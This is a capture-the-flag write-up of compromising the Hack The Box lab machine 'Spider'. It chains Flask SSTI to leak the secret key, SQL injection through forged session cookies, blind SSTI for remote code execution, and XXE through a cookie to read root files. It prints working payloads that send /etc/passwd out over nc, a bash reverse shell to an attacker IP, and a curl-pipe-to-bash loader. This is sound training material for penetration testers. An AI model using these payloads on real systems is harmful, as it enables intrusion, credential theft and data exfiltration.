---
title: HTB: Spider
url: https://0xdf.gitlab.io/2021/10/23/htb-spider.html
date: 2021-10-23T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: hackthebox, htb-spider, ctf, nmap, flask, python, flask-cookie, payloadsallthethings, ssti, jinja2, injection, sqli, sqlmap, sqlmap-eval, ssti-blind, waf, filter, tunnel, xxe
---

![Spider](https://0xdfimages.gitlab.io/img/spider-cover.png)

Spider was all about classic attacks in unusual places. There’s a limited SSTI in a username that allows me to leak a Flask secret. I’ll use that to generate Flask cookies with SQL injection payloads inside to leak a user id, and gain admin access on the site. From there, another SSTI, but this time blind, to get RCE and a shell. For root, there’s a XXE in a cookie that allows me to leak the final flag as well as the root ssh key.

## Box Info

| Name | [Spider](https://hackthebox.com/machines/spider)  [Spider](https://hackthebox.com/machines/spider) [Play on HackTheBox](https://hackthebox.com/machines/spider) |
| --- | --- |
| Release Date | [29 May 2021](https://twitter.com/hackthebox_eu/status/1397900441787277313) |
| Retire Date | 23 Oct 2021 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Spider |
| Radar Graph | Radar chart for Spider |
| First Blood User | 01:31:37[celesian celesian](https://app.hackthebox.com/users/114435) |
| First Blood Root | 02:04:11[clubby789 clubby789](https://app.hackthebox.com/users/83743) |
| Creators | [InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045)  [chivato chivato](https://app.hackthebox.com/users/44614) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@parrot$ nmap -p- --min-rate 5000 -oA scans/nmap-alltcp 10.10.10.243
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-17 10:21 EDT
Nmap scan report for redemption.htb (10.10.10.243)
Host is up (0.093s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.06 seconds
oxdf@parrot$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.243
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-17 10:21 EDT
Nmap scan report for redemption.htb (10.10.10.243)
Host is up (0.094s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 28:f1:61:28:01:63:29:6d:c5:03:6d:a9:f0:b0:66:61 (RSA)
|   256 3a:15:8c:cc:66:f4:9d:cb:ed:8a:1f:f9:d7:ab:d1:cc (ECDSA)
|_  256 a6:d4:0c:8e:5b:aa:3f:93:74:d6:a8:08:c9:52:39:09 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://spider.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.31 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu Bionic 18.04.

The `nmap` script results on 80 show a redirect to `http://spider.htb`. I’ll add that to my `/etc/hosts` file.

### Website - TCP 80

#### Site

Visiting by IP does redirect as observed above. At `spider.htb`, there is a site for Amado Furniture, and seems to be selling chairs:

![image-20210517102941708](https://0xdfimages.gitlab.io/img/image-20210517102941708.png)

Each chair has a product page, and there’s a cart. There’s also an admin page (`/main`) which requires login, redirecting to `/login`:

![image-20210511115521289](https://0xdfimages.gitlab.io/img/image-20210511115521289.png)

There’s also a Register link which leads to `/register`:

![image-20210517103038495](https://0xdfimages.gitlab.io/img/image-20210517103038495.png)

#### Tech Stack

Looking at the first response that comes back on visiting spider.htb, there’s a cookie that gets set, `session`:

```

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 11 May 2021 15:56:36 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Cookie
Set-Cookie: session=eyJjYXJ0X2l0ZW1zIjpbXSwidXNlcm5hbWUiOiIifQ.YJqpNA.cVRqyPAjL-OxhRB9R24sSuBaftw; HttpOnly; Path=/
Content-Length: 11152

```

There’s no other obvious indication as to what kind of backend this site is using besides NGINX. `index.html` and `index.php` don’t exist, but `/index` does load the main page, so this is likely some kind of Python or Ruby hosted site.

The Cookie is interesting. It looks kind of like a JWT, but it isn’t. However, pasting it into a [flask cookie decoder](https://www.kirsle.net/wizards/flask-session.cgi) returns information:

```

{
    "cart_items": [],
    "username": ""
}

```

That’s a good indication this site is based on the Python module, Flask.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, without any extensions, but i notice a bunch of weird looking responses. If I try to load a page while running it, I’ll see:

![image-20210517104158440](https://0xdfimages.gitlab.io/img/image-20210517104158440.png)

This message explains why the results don’t seem accurate, so nothing to find here.

#### Register

I can register for the site using `/register`. When I submit the form, I’m redirected to the login page where it has filled in a UUID as my username:

![image-20210517105324336](https://0xdfimages.gitlab.io/img/image-20210517105324336.png)

Entering my password, it redirects back to the main site. The menu on the left has a “User Information” option now, as well as a logout option:

![image-20210517105502322](https://0xdfimages.gitlab.io/img/image-20210517105502322.png)

Trying to visit the Admin link just redirects back to `/`. User Information will show my username and UUID:

![image-20210517105538885](https://0xdfimages.gitlab.io/img/image-20210517105538885.png)

If I decode my cookie after logging in (and apparently adding an item to my cart), it now has the `uuid` field:

```

{
    "cart_items": [
        "1"
    ],
    "username": "",
    "uuid": "1e05713d-9b4e-4d2c-938b-c5673866ee3e"
}

```

It’s odd that the `username` field is still blank.

## Shell as chiv

### Leak Flask Secret

#### Identify SSTI

Anytime I see a Python webserver I want to check for SSTI. So far, the only thing I can put into the site that is displayed back to me is my username, both in the logout link and in the information page. I’ll try the chart from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#methodology):

![SSTI cheatsheet workflow](https://0xdfimages.gitlab.io/img/serverside.png)

I created the username `0xdf${7*7}`, and logged in. No sign of injection:

![image-20210517105750082](https://0xdfimages.gitlab.io/img/image-20210517105750082.png)

![image-20210517105801413](https://0xdfimages.gitlab.io/img/image-20210517105801413.png)

I tried to register `0xdf{{7*7}}`, but it won’t let me:

![image-20210517105904466](https://0xdfimages.gitlab.io/img/image-20210517105904466.png)

Good to know. I’ll do `0x{{7*7}}`. Nothing at the logout link:

![image-20210517110010743](https://0xdfimages.gitlab.io/img/image-20210517110010743.png)

But in the User Information page, there’s SSTI:

![image-20210517105958902](https://0xdfimages.gitlab.io/img/image-20210517105958902.png)

Just to complete the chart, I’ll try `{{7*'7'}}`. This suggests Jinja2:

![image-20210517110143276](https://0xdfimages.gitlab.io/img/image-20210517110143276.png)

#### Limited Leak

Given that I’m limited to 10 characters in the username, this might not be too valuable. That said, in the [PayloadsAllTheThings Jinja2 - Basic injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---basic-injection) section, it suggests `{{config.items()}}`. That’s too long, but can I just pull the `config`? It turns out yes. In Python, `.items()` returns a list of tuples, `(key, value)`. With username `{{config}}`, it returns the dictionary:

![image-20210517110437141](https://0xdfimages.gitlab.io/img/image-20210517110437141.png)

The full thing overflows the textbox, but I can pull it all out, and find the particularly interesting bit:

```

'SECRET_KEY': 'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942'

```

This key is what is used to sign the cookie for the application to be whatever user I want.

The challenge is, at this point, I don’t know a username or user UUID to try to impersonate.

### Access Admin Panel

#### Strategy

I tested for SQL injection in the registration and login pages without any success. Now that I can craft a cookie, I’ll think about what could happen with that. When I submit a cookie to the site, it will first validate it was signed with the key, then extract the uuid and use that to get a username from the database, for example to display in the logout button or to check when visiting the admin page. There could be an injection point there if that query was given less protection because only someone with the key could craft that payload.

#### Proxy

To interact with the site, I’ll build a simple Flask server that can proxy requests for me. [This post](https://stackoverflow.com/questions/42283778/generating-signed-session-cookie-value-used-in-flask) shows how to get access to the Flask signing bits. My server will listen for a request, and pull a uuid and a optional URL from the GET parameters, and then craft a request with that UUID in the cookie:

```

#!/usr/bin/env python3

import requests
from flask import Flask, request
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = "Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942"
session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)

@app.route('/')
def main():
    uuid = request.args['uuid']
    if 'url' in request.args:
        url = request.args['url']
    else:
        url = 'http://spider.htb'
    cookie_data = {"uuid": uuid, "username": "", "cart_items": []}
    cookie = {"session": session_serializer.dumps(cookie_data)}
    resp = requests.get(url, cookies=cookie)
    return resp.text

app.run()

```

On running it, a Flask server is listening on my box listening on TCP 5000:

```

oxdf@parrot$ python flask_proxy.py 
 * Serving Flask app "flask_proxy" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)

```

I’ll verify the proxy works but trying my current UUID and it works (images break, but page source is good):

![image-20210517114023850](https://0xdfimages.gitlab.io/img/image-20210517114023850.png)

#### SQLI POC

I’ll add a `'` to the end of my UUID, and the page crashes:

![image-20210517114220767](https://0xdfimages.gitlab.io/img/image-20210517114220767.png)

The page also crashes when I change one character in the UUID or set it to 1. Basically, I think that anything that’s not in the DB causes a crash. So I’ll try `http://127.0.0.1:5000/?uuid=%27%20or%201=1--%20-`. This query is based on a guess that the query looks like:

```

select * from users where uuid = '{uuid}';

```

This input would make that into:

```

select * from users where uuid = '' or 1=1-- -';

```

Not only does the page return, but there’s a different user, chiv. That looks a lot like SQL injection.

I can check for `UNION` injection, and it works with just one column:

![image-20210517120115302](https://0xdfimages.gitlab.io/img/image-20210517120115302.png)

#### Manual SQLI

If I can guess that the table is likely named users, and there’s probably a uuid column, I can list the UUIDs in the DB:

[![image-20210517120328824](https://0xdfimages.gitlab.io/img/image-20210517120328824.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210517120328824.png)

I can list the users too - my first guess of username failed, but name worked:

[![image-20210517120410125](https://0xdfimages.gitlab.io/img/image-20210517120410125.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210517120410125.png)

Most of those are me, but the first one is chiv.

#### sqlmap

Alternatively, now that I have the proxy set up, I can just point `sqlmap` at it:

```

oxdf@parrot$ sqlmap -u 'http://127.0.0.1:5000/?uuid=1e05713d-9b4e-4d2c-938b-c5673866ee3e' -p uuid
...[snip]...                            
---                                                                  
Parameter: uuid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: uuid=129f60ea-30cf-4065-afb9-6be45ad38b73' AND 1681=1681 AND 'ZIDK'='ZIDK                                                                 

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uuid=129f60ea-30cf-4065-afb9-6be45ad38b73' AND (SELECT 9112 FROM (SELECT(SLEEP(5)))TFNV) AND 'TgiY'='TgiY                                 

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: uuid=-9189' UNION ALL SELECT CONCAT(0x7178767a71,0x6d774d6a6e51764a4a746445434f76726a724f6f4f4567756b7252505379416772516c696d634955,0x717a6a7071)-- -
---
[11:50:28] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12                                                     ...[snip]...

```

It shows the same injection point I found with `UNION`, as well as some blind alternatives. From here, standard `sqlmap` enumeration. List DBs:

```

0xdf@parrot[~/hackthebox/spider-10.10.10.243]$ sqlmap -u 'http://127.0.0.1:5000/?uuid=1e05713d-9b4e-4d2c-938b-c5673866ee3e' -p uuid --dbs
...[snip]...
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] shop
[*] sys
...[snip]...

```

List the tables in `shop`:

```

oxdf@parrot$ sqlmap -u 'http://127.0.0.1:5000/?uuid=1e05713d-9b4e-4d2c-938b-c5673866ee3e' -p uuid -D shop --tables
...[snip]...
Database: shop
[4 tables]
+----------+
| items    |
| messages |
| support  |
| users    |
+----------+
...[snip]...

```

Dump the `users` table:

```

oxdf@parrot$ sqlmap -u 'http://127.0.0.1:5000/?uuid=1e05713d-9b4e-4d2c-938b-c5673866ee3e' -p uuid -D shop -T users --dump
...[snip]...
Database: shop
Table: users
[7 entries]
+----+--------------------------------------+------------+-----------------+
| id | uuid                                 | name       | password        |
+----+--------------------------------------+------------+-----------------+
| 1  | 129f60ea-30cf-4065-afb9-6be45ad38b73 | chiv       | ch1VW4sHERE7331 |
| 2  | 2185aa99-1f1d-48f6-a835-2410496118d3 | 0xdf       | 0xdf            |
| 3  | fa3975ea-f2d2-4253-9427-4fab9646781f | 0xdf       | 0xdf            |
| 4  | 394160c8-b105-4e73-9c2e-cec37580e8a3 | 0xdf'      | 0xdf            |
| 5  | 63b03184-ec08-411a-bc74-d266797c315d | {{config}} | 0xdf            |
| 6  | 30b4268c-ffb0-4b39-a006-78f39c135921 | {{3*3}}    | q               |
| 7  | 138f3d2f-4da5-44c2-aff1-f243ed2c368a | {{config}} | q               |
+----+--------------------------------------+------------+-----------------+
...[snip]...

```

#### sqlmap Without Proxy

If I had some idea that the cookie values might be vulnable to SQL injection before I wrote the proxy, I could just use the `--eval` flag in `sqlmap` as shown [here](https://book.hacktricks.xyz/pentesting/pentesting-web/flask#flask-unsign). The example they give is:

```

sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump

```

I’ll update that for Spider:

```

oxdf@parrot$ sqlmap http://spider.htb/ --eval "from flask_unsign import session as s; session = s.sign({'uuid': sess
ion}, secret='Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942')" --cookie="session=*" 
...[snip]...
custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
...[snip]...
[12:16:17] [INFO] testing if the target URL content is stable
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you wa
nt to merge them in further requests? [Y/n] n
...[snip]...
(custom) HEADER parameter 'Cookie #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 74 HTTP(s) requests:
---
Parameter: Cookie #1* ((custom) HEADER)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: session=' AND (SELECT 7466 FROM (SELECT(SLEEP(5)))vsxk) AND 'ziEz'='ziEz

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: session=' UNION ALL SELECT CONCAT(0x7170627071,0x57476d444976695a4a78634c4f4348534e50564972517374416f43536c72794e4a4867516b74534c,0x7162707071)-- -
---
...[snip]...

```

I had first tried this with `--batch` to just accept the default answers to any questions, but it is important to look at the questions `sqlmap` is asking. The second one is “the site is trying to set a cookie, do you want to use that [instead of the one you set with `--eval`]?”. It’s important to say no to that.

The result is that it’s able to exploit the SQLi directly, without the proxy.

#### Login

Regardless of how I got it, I now have a UUID and password, allowing me to login as chiv and access `/main`:

![image-20210517142221286](https://0xdfimages.gitlab.io/img/image-20210517142221286.png)

Alternatively, I can add a line in the Flask proxy to print the forged cookie, and then get a signed cookie that says I’m chiv. I’ll add that to Firefox in the dev tools, and it lets me in as chiv as well.

### RCE

#### Enumeration

In the panel, I can send a message, and nothing obvious happens. I can view messages, and it gives the message I sent, as well as another:

![image-20211020122729937](https://0xdfimages.gitlab.io/img/image-20211020122729937.png)

That URL is interesting. It leads to a page to put in a support ticket:

![image-20210517142350712](https://0xdfimages.gitlab.io/img/image-20210517142350712.png)

Some initial testing doesn’t show any SQLi vulns. When I try a SSTI payload, it gives a very specific error message:

![image-20210517142540521](https://0xdfimages.gitlab.io/img/image-20210517142540521.png)

It seems in this dev instance there’s already a check for SSTI in the contact entry (no such error for `{{ }}` in the message field). That suggests some kind of filter / WAF that I’ll need to bypass.

I tried with a contact of:

```

0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`i{|}~ 

```

It returned another error:

![image-20210517142846984](https://0xdfimages.gitlab.io/img/image-20210517142846984.png)

A bit more testing shows that `_`, `'`, and `.` are blocked. Interestingly, `\x2e` (same as `.`) does not cause an issue.

#### SSTI

Given the WAF, it seems like SSTI is the way to go. In reading about SSTI filter bypasses, I found [this post](https://hackmd.io/@Chivato/HyWsJ31dI) by one of the boxes coauthors. It’s got a section called “RCE without using `{{ }}`”. It suggests using `{% %}`. In Jinja2, where `{{ }}` runs the Python inside and puts the result on the page, `{% %}` contains a keyword to do something. `{% %}` is used for things like control flow and including objects like images. For example, you might have `{% if username == '' %}<a>Click here to login</a>{% endif %}`. This would only display the link if the `username` variable were empty.

The example from the post to get RCE and exfil the result using `nc` is:

```

{% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /etc/passwd | nc HOSTNAME 1337')['read']() == 'chiv' %} a {% endif %}

```

This payload is attempting to read `/etc/passwd` and send it back over `nc`.

I’ll have to tweak it a bit to get around the WAF, so I’ll encode the suspect characters to see if that gets through:

```

{% if request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("cat /etc/passwd | nc 10\x2e10\x2e14\x2e7 1337")["read"]() == "chiv" %} a {% endif %}

```

It seems there are some multicharacter rules in place as well:

![image-20210517144030463](https://0xdfimages.gitlab.io/img/image-20210517144030463.png)

Another option with the `{% %}` syntax is to include another object.

```

{% include request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("cat /etc/passwd | nc 10\x2e10\x2e14\x2e7 1337")["read"]()%}

```

The bad news if that the results will not be displayed back to the page, as once the execution happens and returns, it will certainly fail the `include`. But if it works, the execution should have shipped `/etc/passwd` back to me already at that point.

With `nc` listening, submitting that as the message worked!

```

oxdf@parrot$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.243] 51278
root:x:0:0:root:/root:/bin/bash
...[snip]...
chiv:x:1000:1000:chiv:/home/chiv:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false

```

The page hangs until I kill the `nc`, and then it return 500 as expected.

### Shell

I created a `shell.sh` locally:

```

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.7/443 0>&1

```

Then I used this payload to `curl` it and pipe it to Bash:

```

{% include request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("curl 10\x2e10\x2e14\x2e7/shell\x2esh | bash")["read"]()%}

```

Running it gave the request at the webserver:

```

oxdf@parrot$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.243 - - [17/Jun/2021 14:51:27] "GET /shell.sh HTTP/1.1" 200 -

```

And then a shell:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.243] 33582
bash: cannot set terminal process group (85021): Inappropriate ioctl for device
bash: no job control in this shell
chiv@spider:/var/www/webapp$

```

Standard shell upgrade:

```

chiv@spider:/var/www/webapp$ python3 -c 'import pty;pty.spawn("bash")'
python3 -c 'import pty;pty.spawn("bash")'   
chiv@spider:/var/www/webapp$ ^Z             
[1]+  Stopped                 nc -lnvp 443  
oxdf@parrot$ stty raw -echo ; fg
nc -lnvp 443                                
            reset                           
reset: unknown terminal type unknown        
Terminal type? screen                       
chiv@spider:/var/www/webapp$

```

There’s `user.txt`:

```

chiv@spider:~$ cat user.txt
9ecac790************************

```

There’s also an SSH key for chiv:

```

chiv@spider:~$ ls -l .ssh/
total 8
-rw-r--r-- 1 chiv chiv  393 May  4 15:42 authorized_keys
-rw------- 1 chiv chiv 1679 Apr 24  2020 id_rsa

```

## Shell as root

### Enumeration

#### Localhost Webpage

As chiv, I can see another service listening on TCP 8080 but only localhost:

```

chiv@spider:~$ netstat -tnlp
(No info could be read for "-p": geteuid()=1000 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -   

```

I’ll use the SSH key I found to connect with a port forward (using 8888 on my host since 8080 is where Burp is listening):

```

oxdf@parrot$ ssh -i ~/keys/spider-chiv chiv@10.10.10.243 -L 8888:localhost:8080
Last login: Thurs Jun 17 18:58:27 2021 from 10.10.14.7
chiv@spider:~$

```

The site presents a Beta Login:

![image-20210517151047393](https://0xdfimages.gitlab.io/img/image-20210517151047393.png)

The forgot your password link isn’t a link (yet), but just entering 0xdf and clicking Sign In works:

![image-20210517151147209](https://0xdfimages.gitlab.io/img/image-20210517151147209.png)

#### Cookie

The cookie I get looks like another Flask cookie:

```

.eJxNjEFvgyAARv_KwnkHYW4Hk14MqKPTBhSw3jA0w4rWVbJZm_73rcmW7Pjy3vddgVsGB6IreGhBBAQpEkOWivVUcuVHOUB1UPmlzZpOiySs0ik2AmJW81xi_iaI3ZrhdRWlxz9-LEUR75Ip48e4ufs7N4HDTBnKAhI2id21aeELZTsJxbkS9qTh9GGeml6R53mPAqhTWst_f797xtHyojBNNaJ1m0mmexJWmM4H937hg-8kWqBIzedfz1Z3VtKWOonHdrV5Hkxofyz49muzAbdHMJ260c8gCm7fnTdWAQ.YKK_zg.mQ8h46_sFKoJX3tYwTChAHMn_F4

```

It’s a bit weird because it starts with `.`, but that’s ok. The webpage I used before returns “[ERR: Not JSON data]”, but with [Flask-Session-Cookie-Manager](https://pentesttools.net/flask-session-cookie-manager-flask-session-cookie-decoder-encoder/), it works:

```

oxdf@parrot$ flask_session_cookie_manager3.py decode -c ".eJxNjEFvgyAARv_KwnkHYW4Hk14MqKPTBhSw3jA0w4rWVbJZm_73rcmW7Pjy3vddgVsGB6IreGhBBAQpEkOWiv
VUcuVHOUB1UPmlzZpOiySs0ik2AmJW81xi_iaI3ZrhdRWlxz9-LEUR75Ip48e4ufs7N4HDTBnKAhI2id21aeELZTsJxbkS9qTh9GGeml6R53mPAqhTWst_f797xtHyojBNNaJ1m0mmexJWmM4H937hg-8kWqBIzedfz1Z3VtKWOonHdrV5H
kxofyz49muzAbdHMJ260c8gCm7fnTdWAQ.YKK9SA.ZnFXo18wKoHWbV49IYW0FzToOQY"
b'{"lxml":{" b":"UENFdExTQkJVRWtnVm1WeWMybHZiaUF4TGpBdU1DQXRMVDRLUEhKdmIzUStDaUFnSUNBOFpHRjBZVDRLSUNBZ0lDQWdJQ0E4ZFhObGNtNWhiV1UrTUhoa1pqd3ZkWE5sY201aGJXVStDaUFnSUNBZ0lDQWdQR2x6WDJGa2JXbHVQakE4TDJselgyRmtiV2x1UGdvZ0lDQWdQQzlrWVhSaFBnbzhMM0p2YjNRKw=="},"points":0}'

```

`lxml` is an interesting keyword. [lxml](https://lxml.de/) is a library for processing XML with Python. I’ll decode the value, and it looks like more Base64:

```

oxdf@parrot$ echo "UENFdExTQkJVRWtnVm1WeWMybHZiaUF4TGpBdU1DQXRMVDRLUEhKdmIzUStDaUFnSUNBOFpHRjBZVDRLSUNBZ0lDQWdJQ0E4ZFhObGNtNWhiV1UrTUhoa1pqd3ZkWE5sY201aGJXVStDaUFnSUNBZ0lDQWdQR2x6WDJGa2JXbHVQakE4TDJselgyRmtiV2x1UGdvZ0lDQWdQQzlrWVhSaFBnbzhMM0p2YjNRKw==" | base64 -d
PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+MHhkZjwvdXNlcm5hbWU+CiAgICAgICAgPGlzX2FkbWluPjA8L2lzX2FkbWluPgogICAgPC9kYXRhPgo8L3Jvb3Q+
oxdf@parrot$ echo "UENFdExTQkJVRWtnVm1WeWMybHZiaUF4TGpBdU1DQXRMVDRLUEhKdmIzUStDaUFnSUNBOFpHRjBZVDRLSUNBZ0lDQWdJQ0E4ZFhObGNtNWhiV1UrTUhoa1pqd3ZkWE5sY201aGJXVStDaUFnSUNBZ0lDQWdQR2x6WDJGa2JXbHVQakE4TDJselgyRmtiV2x1UGdvZ0lDQWdQQzlrWVhSaFBnbzhMM0p2YjNRKw==" | base64 -d | base64 -d
<!-- API Version 1.0.0 -->
<root>
    <data>
        <username>0xdf</username>
        <is_admin>0</is_admin>
    </data>
</root>

```

On decoding it again, it’s XML.

### XXE

#### Flag

Any time I see XML going to a website I want to try an XML External Entity (XXE) attack. In this case, the cookie looks to be crafted from my input at the login page. That POST request body looks like:

```

username=0xdf&version=1.0.0

```

That makes a cookie that looks like:

```

<!-- API Version 1.0.0 -->
<root>
    <data>
        <username>0xdf</username>
        <is_admin>0</is_admin>
    </data>
</root>

```

I wrote a quick script that will take a username and version, log into the site, collect the returned cookie, decode it down to XML, and print it:

```

#!/bin/bash

username=$(echo $1 | sed 's/\\n/\n/g')
version=$(echo $2 | sed 's/\\n/\n/g')

cookie=$(curl -s -v -X POST 'http://127.0.0.1:8888/login' --data-urlencode "username=$username" --data-urlencode "version=$version" -x http://127.0.0.1:8080 2>&1 |               
    grep Set-Cookie |                               
    cut -d'=' -f2 |              
    cut -d';' -f1)
echo "[+] Got cookie: $cookie" 
flask_session_cookie_manager3.py decode -c $cookie |
    cut -d"'" -f2 |                                           
    jq -r '.lxml." b"' |                      
    base64 -d |          
    base64 -d
echo

```

Running it prints the decoded XML:

```

oxdf@parrot$ ./test-cookie.sh 0xdf 1.0.0
<!-- API Version 1.0.0 -->
<root>
    <data>
        <username>0xdf</username>
        <is_admin>0</is_admin>
    </data>
</root>

```

What’s cool is that by playing around with this, I can see how I can mess with the cookie. For example, I can use comments to add stuff outside the `<root>`:

```

oxdf@parrot$ bash ./test-cookie.sh 0xdf '-->Dangerous stuff!<!--'
<!-- API Version -->Dangerous stuff!<!-- -->
<root>
    <data>
        <username>0xdf</username>
        <is_admin>0</is_admin>
    </data>
</root>

```

XXE is typically good for reading files from the file system. Can I get `root.txt`? I’ll generate a payload like this:

```

oxdf@parrot$ bash ./test-cookie.sh '&test;' '1.0.0 -->\n\n<!DOCTYPE root [<!ENTITY test SYSTEM "file:///root/root.txt">]><!-- '
[+] Got cookie: .eJxtkEtPhDAYRf-K6doFIJM4k7iwQnloixT6dWBXUiIMBZuBZF7xv8ti3Lm-9-ac3Bsy59Gg3Q09NGiHRMiIDs9lPqTA5TLB6MpW0ksT170SxC8ji7Vwg3zPKQT8I_fskyIpyQSXfDxzYdhbK5NLVuKUT9QvAGTp1qQhsBdOcpKmy2hootJYoJBGQBhWYJcmZgqirVfGw-a-p9SxXnVgXEueqACn6gCDiFbe6kcjTcX19bjy_Xs_r73tVAiGaxfHYuwG7og1N7h2TJBLneYOmUTYydbYqpighiuZRWQUJbYqD_iznbRXky5rIrYw2fXg_rfXc2u-LnxcevDO7uqDs_C0_mMrOtTHyuhZA54a769PN8o11eqz-j37ZcDe9ZhcRTG_oJ9HZL_7aZnRzvn5BTubgkc.YKLbYw.gx88jbKZCDX4VjKnKGJvoEv5vLg
<!-- API Version 1.0.0 -->

<!DOCTYPE root [<!ENTITY test SYSTEM "file:///root/root.txt">]><!-- -->
<root>
    <data>
        <username>&test;</username>
        <is_admin>0</is_admin>
    </data>
</root>

```

That is a solid looking XXE payload that tries to read `root.txt`. Now I need to put this into my browser and visit the page. I suspect the flag will be in the “Welcome, [here]”. It worked:

![image-20210517171106925](https://0xdfimages.gitlab.io/img/image-20210517171106925.png)

#### Script Improvements

I want to automate this a bit more, so I’ll add to the script to pull out the returned XXE value. I’ll also adjust the arguments now that I have the XXE down to just take a filepath:

```

#!/bin/bash

cookie=$(curl -s -v -X POST 'http://127.0.0.1:8888/login' --data-urlencode "username=&test;" --data-urlencode "version=1.0.0 -->
                                                                                   
<!DOCTYPE root [<!ENTITY test SYSTEM '"$1"'>]><!--" -x http://127.0.0.1:8080 2>&1 |
    grep Set-Cookie | 
    cut -d'=' -f2 |
    cut -d';' -f1)
>&2 echo "[+] Got cookie: $cookie"
>&2 flask_session_cookie_manager3.py decode -c $cookie | 
    cut -d"'" -f2 | 
    jq -r '.lxml." b"' | 
    base64 -d | 
    base64 -d

>&2 echo
curl -s -x http://127.0.0.1:8080 -b "session=$cookie" http://127.0.0.1:8888/site |
    pup '#welcome text{}' | 
    sed 's/Welcome, //g'

```

This will use `pup` to get the text from the welcome tag, and `sed` to remove the welcome text. It also prints messages to stderr so that I could redirect stdout to a file to get just the file locally.

### SSH

There’s an SSH key in `/root/.ssh`:

```

oxdf@parrot$ bash read-file.sh /root/.ssh/id_rsa
